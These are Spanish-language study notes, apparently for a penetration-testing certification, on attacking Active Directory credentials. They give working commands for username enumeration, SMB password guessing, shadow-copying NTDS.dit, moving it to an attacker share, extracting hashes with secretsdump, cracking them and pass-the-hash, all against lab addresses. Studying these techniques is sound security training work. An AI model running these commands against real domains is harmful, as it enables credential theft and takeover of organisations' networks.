
## 1. Autenticación en Active Directory

Cuando un equipo Windows se une a un dominio, las solicitudes de autenticación de las cuentas de dominio se validan normalmente mediante un **Controlador de Dominio (DC)**, en lugar de utilizar la base de datos SAM local.

Sin embargo, las cuentas locales siguen estando disponibles.

Para especificar una cuenta local podemos utilizar:

```
WS01\usuario
```

O bien:

```
.\usuario
```

### Conceptos clave

- **SAM:** almacena las cuentas y los hashes de las contraseñas locales.
    
- **Active Directory (AD):** administra usuarios, grupos, equipos y otros recursos del dominio.
    
- **Domain Controller (DC):** valida las autenticaciones del dominio.
    
- **NTDS.dit:** base de datos principal de Active Directory, que contiene información de las cuentas del dominio y material de autenticación.
    
- **NTLM y Kerberos:** protocolos de autenticación utilizados en entornos Windows.
    

El objetivo de esta sección es obtener credenciales de cuentas de AD mediante ataques de diccionario y extraer hashes de contraseñas del archivo `NTDS.dit`.

---

## 2. Ataques de diccionario contra cuentas de AD

Un ataque de diccionario consiste en probar una lista de posibles contraseñas contra una cuenta o servicio.

En entornos Active Directory, podemos utilizar **NetExec** para realizar intentos de autenticación mediante SMB.

Estos ataques pueden generar bastante tráfico y eventos de seguridad. Además, pueden provocar el bloqueo de cuentas si existe una política de bloqueo configurada.

### 2.1. Identificar convenciones de nombres de usuario

Antes de atacar contraseñas, debemos identificar nombres de usuario válidos.

Algunas convenciones habituales son:

|Convención|Ejemplo|
|---|---|
|Inicial del nombre + apellido|`jdoe`|
|Inicial del nombre + inicial del segundo nombre + apellido|`jjdoe`|
|Nombre + apellido|`janedoe`|
|Nombre.apellido|`jane.doe`|
|Apellido.nombre|`doe.jane`|

Las direcciones de correo electrónico también pueden revelar la convención utilizada.

Por ejemplo:

```
jdoe@inlanefreight.com
```

Podría indicar que el nombre de usuario es `jdoe`.

### 2.2. Crear una lista de usuarios

Podemos generar manualmente un archivo con posibles nombres de usuario:

```
nano usernames.txt
```

Ejemplo de contenido:

```
bwilliamson
benwilliamson
ben.williamson
williamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```

Cuanto mejor conozcamos la convención de nombres de la organización, menos combinaciones tendremos que probar.

### 2.3. Generar nombres automáticamente con Username Anarchy

**Username Anarchy** permite generar posibles nombres de usuario a partir de una lista de nombres reales.

```
./username-anarchy -i /home/usuario/names.txt
```

Esto genera diferentes combinaciones de nombres y apellidos que podemos guardar para su posterior enumeración.

## 3. Enumerar usuarios válidos con Kerbrute

Antes de probar contraseñas, podemos comprobar qué nombres de usuario existen en el dominio mediante **Kerbrute**.

### Comando

```
./kerbrute_linux_amd64 userenum \
  --dc 10.129.201.57 \
  --domain inlanefreight.local \
  names.txt
```

Parámetros:

|Parámetro|Función|
|---|---|
|`userenum`|Enumera nombres de usuario válidos.|
|`--dc`|Especifica la dirección IP del controlador de dominio.|
|`--domain`|Especifica el dominio de Active Directory.|
|`names.txt`|Archivo con los nombres de usuario que se van a comprobar.|

Una respuesta como esta indica que Kerbrute ha identificado un usuario válido:

```
[+] VALID USERNAME: bwilliamson@inlanefreight.local
```

**Metodología recomendada:** generar usuarios → enumerar los válidos → probar contraseñas únicamente contra las cuentas identificadas.

---

## 4. Ataque de fuerza bruta con NetExec

Una vez identificado un usuario válido, podemos comprobar contraseñas mediante SMB utilizando NetExec.

### Comando

```
netexec smb 10.129.201.57 \
  -u bwilliamson \
  -p /usr/share/wordlists/fasttrack.txt
```

Parámetros:

|Parámetro|Función|
|---|---|
|`smb`|Utiliza el protocolo SMB.|
|`-u`|Especifica el usuario.|
|`-p`|Especifica una contraseña o un archivo de contraseñas.|

Una autenticación correcta puede aparecer así:

```
[+] inlanefrieght.local\bwilliamson:P@55w0rd!
```

### Consideraciones

- Una lista de contraseñas permite comprobar varias posibilidades contra una cuenta.
    
- Una política de bloqueo puede impedir nuevos intentos y bloquear la cuenta.
    
- Los intentos fallidos pueden generar eventos de seguridad.
    
- Los ataques de diccionario y el password spraying son técnicas diferentes: el primero prueba múltiples contraseñas contra una cuenta; el segundo suele probar una contraseña contra múltiples cuentas.
    

### Detección mediante Event Viewer

En Windows, los administradores pueden revisar los registros de seguridad mediante **Event Viewer**.

El evento **4776** está relacionado con la validación de credenciales mediante NTLM y puede ayudar a investigar determinados intentos de autenticación.

## 5. ¿Qué es NTDS.dit?

`NTDS.dit` es la base de datos principal de Active Directory.

Su ubicación predeterminada en un controlador de dominio suele ser:

```
C:\Windows\NTDS\NTDS.dit
```

También puede estar almacenada en otra ubicación si se configuró así durante la instalación.

El archivo contiene información crítica del dominio, incluidos datos relacionados con las cuentas y sus hashes de contraseñas.

Si conseguimos una copia y extraemos los hashes, podremos intentar recuperar contraseñas o utilizar determinadas técnicas de autenticación con hashes.

**Importante:** los hashes de `NTDS.dit` están protegidos mediante claves derivadas de información almacenada en el registro de Windows. Para extraerlos con la técnica mostrada en esta sección, necesitamos tanto `NTDS.dit` como el archivo `SYSTEM`.

---

## 6. Conectarse al controlador de dominio con Evil-WinRM

Si obtenemos credenciales válidas y la cuenta tiene permisos para utilizar WinRM, podemos intentar establecer una sesión remota.

```
evil-winrm -i 10.129.201.57 \
  -u bwilliamson \
  -p 'P@55w0rd!'
```

Evil-WinRM proporciona una consola PowerShell remota sobre Windows Remote Management.

**Tener credenciales válidas no garantiza el acceso:** la cuenta debe disponer de los permisos necesarios y WinRM debe estar accesible.

## 7. Comprobar los privilegios de la cuenta

Antes de intentar obtener `NTDS.dit`, debemos identificar los privilegios de la cuenta comprometida.

### 7.1. Consultar los grupos locales

```
net localgroup
```

Este comando enumera los grupos locales del sistema, incluidos grupos como:

```
Administrators
Backup Operators
Remote Management Users
```

La pertenencia a determinados grupos puede proporcionar privilegios relevantes para acceder a archivos sensibles.

### 7.2. Consultar la información del usuario

```
net user bwilliamson
```

La salida puede mostrar información como:

```
Local Group Memberships
Global Group memberships
```

En el ejemplo del módulo, la cuenta pertenece a:

```
Domain Users
Domain Admins
```

Esto indica que dispone de privilegios elevados en el dominio.

**Punto clave:** para obtener una copia de `NTDS.dit` mediante los métodos descritos, necesitamos privilegios suficientes en el controlador de dominio. El módulo destaca los derechos de administrador local o de administrador de dominio, o equivalentes.

## 8. Obtener una copia de NTDS.dit mediante Volume Shadow Copy

Una dificultad al copiar `NTDS.dit` directamente es que Active Directory utiliza activamente la base de datos.

Podemos utilizar **Volume Shadow Copy Service (VSS)** para crear una instantánea del volumen y copiar el archivo desde ella.

VSS permite crear copias de volúmenes mientras están en uso.

### Paso 1. Crear una instantánea de C:

Desde una consola PowerShell con los privilegios necesarios:

```
vssadmin CREATE SHADOW /For=C:
```

La salida puede incluir un identificador y una ruta similar a:

```
Shadow Copy Volume Name:
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

### Paso 2. Copiar NTDS.dit desde la instantánea

Crear un directorio de destino:

```
mkdir C:\NTDS
```

Copiar el archivo desde la instantánea:

```
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
```

La ruta de `HarddiskVolumeShadowCopy` debe sustituirse por la que haya devuelto el sistema.

### Paso 3. Transferir el archivo al equipo atacante

El módulo muestra la posibilidad de utilizar un recurso compartido SMB accesible desde el controlador de dominio.

Por ejemplo:

```
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```

En este ejemplo, `10.10.15.30` es la dirección del equipo atacante y `CompData` es el recurso compartido utilizado para recibir el archivo.

**Importante:** para extraer los hashes con el método descrito, también debemos obtener el archivo `SYSTEM`.

## 9. Extraer hashes con Impacket

Una vez que tenemos ambos archivos en nuestro equipo atacante, podemos utilizar `impacket-secretsdump` para extraer los hashes.

```
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

### Parámetros

|Parámetro|Función|
|---|---|
|`-ntds NTDS.dit`|Especifica la base de datos de Active Directory.|
|`-system SYSTEM`|Especifica el archivo SYSTEM necesario para descifrar los datos.|
|`LOCAL`|Indica que se procesarán los archivos locales proporcionados.|

La salida contiene registros con un formato similar a:

```
usuario:RID:LMHASH:NTHASH:::
```

Ejemplo:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

### Interpretar el resultado

|Campo|Significado|
|---|---|
|`usuario`|Nombre de la cuenta.|
|`RID`|Identificador relativo de la cuenta.|
|`LMHASH`|Campo correspondiente al hash LM.|
|`NTHASH`|Hash NT de la contraseña.|

El hash NT puede utilizarse para intentar recuperar la contraseña mediante cracking o para probar técnicas de autenticación compatibles.

## 10. Extraer NTDS mediante NetExec

NetExec también puede automatizar la extracción de hashes de Active Directory mediante su módulo `ntdsutil`.

### Comando

```
netexec smb 10.129.201.57 \
  -u bwilliamson \
  -p 'P@55w0rd!' \
  -M ntdsutil
```

Este módulo puede realizar automáticamente las operaciones necesarias para obtener y procesar el volcado de `NTDS.dit`.

La salida puede mostrar:

- Autenticación correcta.
    
- Creación del volcado en el controlador de dominio.
    
- Transferencia del volcado al equipo atacante.
    
- Extracción de hashes NT.
    
- Información adicional sobre claves Kerberos, cuando está disponible.
    
- Eliminación del directorio temporal remoto utilizado por el módulo.
    

Una autenticación correcta por SMB no es suficiente por sí sola: la cuenta debe tener privilegios adecuados para realizar la extracción.

---

## 11. Crackear los hashes con Hashcat

Una vez obtenido un hash NT, podemos intentar recuperar su contraseña mediante un ataque de diccionario.

### Crackear un hash individual

```
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

### Parámetros

|Parámetro|Función|
|---|---|
|`-m 1000`|Selecciona el modo de hash NTLM.|
|Hash|Especifica el hash que se quiere atacar.|
|`rockyou.txt`|Lista de contraseñas que se probarán.|

Ejemplo de resultado:

```
64f12cddaa88057e06a81b54e73b949b:Password1
```

Si el hash no se encuentra en la lista, podemos probar otras listas o estrategias de cracking.

**Importante:** no siempre es posible recuperar una contraseña a partir de su hash.

---

## 12. Pass the Hash (PtH)

Si no conseguimos crackear un hash NT, todavía podemos intentar utilizarlo directamente mediante **Pass the Hash**, siempre que el protocolo y el sistema permitan este tipo de autenticación.

PtH aprovecha NTLM para autenticarse utilizando el hash de la contraseña en lugar de conocer la contraseña en texto claro.

### Ejemplo con Evil-WinRM

```
evil-winrm -i 10.129.201.57 \
  -u Administrator \
  -H 64f12cddaa88057e06a81b54e73b949b
```

El parámetro `-H` especifica el hash de la contraseña.

Si la autenticación funciona y la cuenta dispone de los permisos necesarios, podremos acceder al sistema sin haber recuperado la contraseña original.

### Diferencias importantes

|Técnica|Qué necesitamos|
|---|---|
|Password cracking|Un hash y una estrategia para recuperar la contraseña.|
|Pass the Hash|Un hash NT utilizable y un servicio compatible con la autenticación mediante NTLM.|
|Autenticación con contraseña|Una contraseña válida en texto claro.|

PtH puede ser especialmente útil para el movimiento lateral entre sistemas Windows.

## 13. Flujo de trabajo para CPTS/OSCP

```
1. Obtener acceso a la red interna
              |
              v
2. Identificar posibles usuarios
              |
              v
3. Generar usernames.txt
              |
              v
4. Enumerar usuarios con Kerbrute
              |
              v
5. Comprobar contraseñas con NetExec
              |
              v
6. Obtener credenciales válidas
              |
              v
7. Acceder mediante Evil-WinRM, si está permitido
              |
              v
8. Enumerar privilegios y grupos
              |
              v
9. Comprobar si tenemos permisos suficientes
              |
              v
10. Obtener NTDS.dit y SYSTEM
              |
              v
11. Extraer hashes con secretsdump
              |
              v
12. Intentar crackear los hashes con Hashcat
              |
              v
13. Considerar Pass the Hash si el cracking falla
```

## 15. Puntos clave para el examen

- Los inicios de sesión de dominio se validan normalmente mediante un controlador de dominio, mientras que las cuentas locales siguen dependiendo de SAM.
    
- Kerbrute permite enumerar usuarios válidos antes de probar contraseñas.
    
- NetExec permite comprobar credenciales mediante SMB.
    
- Los ataques de diccionario pueden generar eventos de seguridad y provocar bloqueos de cuentas.
    
- `NTDS.dit` contiene información crítica de Active Directory, incluidos hashes de contraseñas.
    
- La pertenencia a grupos y los privilegios efectivos determinan si podemos obtener la base de datos.
    
- VSS permite crear una instantánea para copiar una base de datos que está en uso.
    
- Para el procedimiento de extracción descrito, necesitamos `NTDS.dit` y `SYSTEM`.
    
- `impacket-secretsdump` permite extraer los hashes de los archivos obtenidos.
    
- Hashcat utiliza `-m 1000` para atacar hashes NTLM.
    
- Si no recuperamos la contraseña, podemos considerar PtH cuando el sistema y el protocolo sean compatibles.
    
- **Obtener un hash no significa que tengamos acceso automáticamente:** todavía debemos comprobar si podemos crackearlo o utilizarlo para autenticarnos.
